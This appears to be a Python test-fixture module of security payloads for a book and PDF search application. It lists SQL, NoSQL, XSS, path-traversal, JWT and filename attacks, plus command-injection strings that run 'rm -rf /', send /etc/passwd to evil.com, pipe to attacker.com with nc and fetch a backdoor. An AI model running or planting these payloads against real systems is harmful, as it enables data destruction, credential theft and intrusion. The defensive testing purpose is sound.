"""
Security test payloads and mock data.

This module contains various malicious payloads for security testing.
"""

# SQL Injection Payloads
SQL_INJECTION_PAYLOADS = [
    "'; DROP TABLE books; --",
    "1' OR '1'='1",
    "' UNION SELECT * FROM users --",
    "'; DELETE FROM embeddings; --",
    "1' AND (SELECT COUNT(*) FROM users) > 0 --",
    "' OR 1=1#",
    "admin'--",
    "' OR 'x'='x",
    "1'; EXEC xp_cmdshell('whoami'); --",
    "' OR 1=1 LIMIT 1 OFFSET 0 --",
]

# XSS Payloads
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "javascript:alert('XSS')",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "';alert(String.fromCharCode(88,83,83))//",
    "\"><script>alert('XSS')</script>",
    "<iframe src=\"javascript:alert('XSS')\"></iframe>",
    "<body onload=alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<select onfocus=alert('XSS') autofocus>",
]

# Path Traversal Payloads
PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "/etc/shadow",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",  # URL encoded
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "\\..\\..\\..\\etc\\passwd",
    "....//....//....//windows/system32/drivers/etc/hosts",
    "../../../../../proc/self/environ",
    "..\\..\\..\\boot.ini",
]

# Command Injection Payloads
COMMAND_INJECTION_PAYLOADS = [
    "book.pdf; rm -rf /",
    "document.pdf && cat /etc/passwd",
    "file.pdf | nc attacker.com 4444",
    "book.pdf `whoami`",
    "doc.pdf $(cat /etc/passwd)",
    "file.pdf; curl http://evil.com/steal?data=`cat /etc/passwd`",
    "; ping -c 4 127.0.0.1",
    "| wget http://evil.com/backdoor.sh",
]

# NoSQL Injection Payloads
NOSQL_INJECTION_PAYLOADS = [
    {"$where": "function() { return true; }"},
    {"book_id": {"$ne": None}},
    {"$or": [{"book_id": {"$exists": True}}]},
    {"metadata": {"$regex": ".*"}},
    {"$eval": "db.books.drop()"},
    {"book_id": {"$gt": ""}},  # Always true condition
]

# Malicious File Names
MALICIOUS_FILENAMES = [
    "malware.exe",
    "script.bat",
    "trojan.scr",
    "backdoor.php",
    "shell.jsp",
    "virus.com",
    "fake.pdf.exe",  # Double extension
    "document.pdf.bat",
    "book.pdf\x00.exe",  # Null byte injection
]

# Legitimate Test Data
LEGITIMATE_SEARCH_QUERIES = [
    "technical analysis",
    "trading strategies",
    "market volatility",
    "risk management",
    "portfolio optimization",
    "algorithmic trading",
    "machine learning in finance",
]

LEGITIMATE_FILENAMES = [
    "trading_guide.pdf",
    "technical_analysis_2023.pdf",
    "market-structure.pdf",
    "book_chapter_1.pdf",
    "risk_management_handbook.pdf",
    "algorithmic_trading_strategies.pdf",
]

LEGITIMATE_FILE_PATHS = [
    "data/books/trading_guide.pdf",
    "uploads/user_document.pdf",
    "Knowledge/book_chapter.pdf",
    "documents/analysis.pdf",
]

# Edge Case Inputs
EDGE_CASE_INPUTS = [
    "",  # Empty string
    " ",  # Single space
    "\n",  # Newline only
    "\t",  # Tab only
    "a" * 1000,  # Very long string
    "äöüß",  # Unicode characters
    "😀🚀📊",  # Emoji
    "test\x00null",  # Null byte
    "test\nnewline",  # Embedded newline
]

# JWT Token Manipulation Payloads
JWT_ATTACK_PAYLOADS = [
    {
        "header": {"alg": "none", "typ": "JWT"},
        "payload": {"sub": "admin", "exp": 9999999999}
    },
    {
        "header": {"alg": "HS256", "typ": "JWT"},
        "payload": {"sub": "../../../admin", "exp": 9999999999}
    },
    {
        "header": {"alg": "RS256", "typ": "JWT"},
        "payload": {"sub": "admin", "exp": 9999999999, "role": "administrator"}
    },
]

# Timing Attack Test Data
TIMING_ATTACK_DATA = {
    "correct_password": "correct_password_123!",
    "wrong_passwords": [
        "a",
        "ab",
        "abc",
        "wrong_password",
        "almost_correct_password_123!",
        "correct_password_124!",
    ]
}